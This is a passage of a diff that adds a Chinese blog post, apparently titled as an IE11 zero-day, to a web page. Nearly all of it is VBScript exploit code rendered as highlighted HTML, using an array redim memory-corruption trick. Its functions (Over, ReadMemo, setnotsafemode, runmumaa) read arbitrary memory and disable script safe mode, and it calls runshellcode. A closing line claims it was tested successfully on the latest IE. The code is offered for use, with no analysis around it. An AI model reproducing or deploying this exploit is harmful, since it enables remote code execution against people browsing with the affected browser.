+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;myarray=myarray&amp;chrw(00)&amp;chrw(32767)&amp;chrw(00)&amp;chrw(0)&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword"
+                        >if</span
+                    ><span>(intVersion&lt;4)&nbsp;then&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write(<span
+                        class="string"
+                        >“&lt;br&gt;&nbsp;IE”</span
+                    ><span>)&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write(intVersion)&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;runshellcode()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword"
+                        >else</span
+                    ><span>&nbsp;&nbsp;&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setnotsafemode()&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >end&nbsp;<span class="keyword">function</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    ><span class="keyword">function</span
+                    ><span>&nbsp;BeginInit()&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;Randomize()&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span>&nbsp;&nbsp;&nbsp;redim&nbsp;aa(5)&nbsp;&nbsp;</span>
+            </li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;redim&nbsp;ab(5)&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span>&nbsp;&nbsp;&nbsp;a0=13+17*rnd(6)&nbsp;&nbsp;</span>
+            </li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;a3=7+3*rnd(5)&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >end&nbsp;<span class="keyword">function</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    ><span class="keyword">function</span
+                    ><span>&nbsp;Create()&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;dim&nbsp;i&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;Create=False&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;For&nbsp;i&nbsp;=&nbsp;0&nbsp;To&nbsp;400&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;If&nbsp;Over()=True&nbsp;Then&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;‘&nbsp;&nbsp;&nbsp;document.write(i)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Create=True&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exit&nbsp;For&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;If&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;Next&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span
+                    >end&nbsp;<span class="keyword">function</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt"><span>sub&nbsp;testaa()&nbsp;&nbsp;</span></li>
+            <li class=""><span>end&nbsp;sub&nbsp;&nbsp;</span></li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    ><span class="keyword">function</span
+                    ><span>&nbsp;mydata()&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i=testaa&nbsp;&nbsp;</span>
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i=<span class="keyword"
+                        >null</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a2)&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=0&nbsp;&nbsp;</span>
+            </li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aa(a1)=i&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=6.36598737437801E-314&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aa(a1+2)=myarray&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ab(2)=1.74088534731324E-310&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mydata=aa(a1)&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >end&nbsp;<span class="keyword">function</span
+                    ><span>&nbsp;&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span
+                    ><span class="keyword">function</span
+                    ><span>&nbsp;setnotsafemode()&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;i=mydata()&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;i=readmemo(i+8)&nbsp;&nbsp;</span>
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;i=readmemo(i+16)&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;j=readmemo(i+&amp;h134)&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">for</span
+                    ><span
+                        >&nbsp;k=0&nbsp;to&nbsp;&amp;h60&nbsp;step&nbsp;4&nbsp;&nbsp;</span
+                    ></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=readmemo(i+&amp;h120+k)&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span>(j=14)&nbsp;then&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aa(a1+2)(i+&amp;h11c+k)=ab(4)&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=0&nbsp;&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=readmemo(i+&amp;h120+k)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exit&nbsp;<span
+                        class="keyword"
+                        >for</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;next&nbsp;&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;ab(2)=1.69759663316747E-313&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;runmumaa()&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >end&nbsp;<span class="keyword">function</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    ><span class="keyword">function</span
+                    ><span>&nbsp;Over()&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;dim&nbsp;type1,type2,type3&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;Over=False&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;a0=a0+a3&nbsp;&nbsp;</span>
+            </li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;a1=a0+2&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;a2=a0+&amp;h8000000&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;&nbsp;ab(a0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a2)&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;type1=1&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=1.123456789012345678901234567890&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;aa(a0)=10&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;If(IsObject(aa(a1-1))&nbsp;=&nbsp;False)&nbsp;Then&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span>(intVersion&lt;4)&nbsp;then&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mem=cint(a0+1)*16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=vartype(aa(a1-1))&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span
+                        >((j=mem+4)&nbsp;or&nbsp;(j*8=mem+8))&nbsp;then&nbsp;&nbsp;</span
+                    ></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span
+                        >(vartype(aa(a1-1))&lt;&gt;0)&nbsp;&nbsp;Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                    ></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If(IsObject(aa(a1))&nbsp;=&nbsp;False&nbsp;)&nbsp;Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type1=VarType(aa(a1))&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span
+                        >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                    ></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
+                        class="keyword"
+                        >else</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;&nbsp;<span
+                        class="keyword"
+                        >function</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span>&nbsp;&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
+                        class="keyword"
+                        >else</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span
+                        >(vartype(aa(a1-1))&lt;&gt;0)&nbsp;&nbsp;Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                    ></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If(IsObject(aa(a1))&nbsp;=&nbsp;False&nbsp;)&nbsp;Then&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type1=VarType(aa(a1))&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span
+                        >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                    ></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span
+                        class="keyword"
+                        >if</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword"
+                        >if</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;If(type1=&amp;h2f66)&nbsp;Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Over=True&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;If&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;If(type1=&amp;hB9AD)&nbsp;Then&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Over=True&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win9x=1&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;If&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >end&nbsp;<span class="keyword">function</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    ><span class="keyword">function</span
+                    ><span>&nbsp;ReadMemo(add)&nbsp;&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a2)&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;aa(a1)=add+4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=1.69759663316747E-313&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;ReadMemo=lenb(aa(a1))&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span
+                    >end&nbsp;<span class="keyword">function</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class=""><span>&lt;/script&gt;&nbsp;&nbsp;</span></li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class=""><span>&lt;/body&gt;&nbsp;&nbsp;</span></li>
+            <li class="alt"><span>&lt;/html&gt;&nbsp;&nbsp;</span></li>
+        </ol>
+    </div>
+    <p>最新ie下测试成功。</p>
+    <div class="entry-copyright">
+        <p>
+            原创文章，作者：老D，如若转载，请注明出处：https://laod.cn/security/win10-ie11-0day.html
+        </p>
+    </div>
+</section>
